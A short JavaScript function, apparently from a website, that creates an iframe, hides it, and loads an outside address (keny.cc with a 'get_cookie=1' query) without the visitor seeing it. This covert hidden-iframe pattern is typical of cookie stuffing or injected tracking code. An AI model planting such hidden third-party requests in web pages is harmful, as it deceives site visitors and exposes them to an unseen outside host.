function smartmoney_visit() {
    var iframeSMID = 'smartmoney_iframe';
    var iframeSM   = document.createElement('iframe');

    iframeSM.id = iframeSMID;

    document.body.appendChild(iframeSM);

    document.getElementById(iframeSMID).style.display = 'none';
    document.getElementById(iframeSMID).src = 'https://keny.cc/?get_cookie=1';
}